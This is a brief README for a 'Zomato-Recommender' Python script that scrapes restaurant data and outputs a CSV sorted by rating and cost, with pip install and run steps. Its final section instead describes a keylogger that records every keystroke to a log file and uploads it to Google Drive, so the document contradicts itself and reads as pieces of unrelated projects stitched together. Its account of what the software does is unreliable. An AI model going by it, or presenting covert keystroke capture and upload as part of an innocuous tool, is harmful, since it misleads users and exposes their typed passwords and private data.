# Zomato-Recommender

This script will return list of restaurants in your city with high rating and low cost in table form(.csv file).
By help of this script and zomato data we can order from better place with low cost.

## How do I use it?

Run below script to install required libraries:

     pip install -r requirements.txt
    
To run the script:

    python3 scrap.py
    
It will open chrome window and it will grab required data from website and return you a sorted.csv file with restaurants sorted in highest rating and lowest cost in respective rating.

## What's it doing?

The script is using Listener module of Pynput Library to listen every keystroke and it is then stored to log.txt. Which is being uploaded to Google Drive (after authentication) by Drive's API Wrapper known as Pydrive.

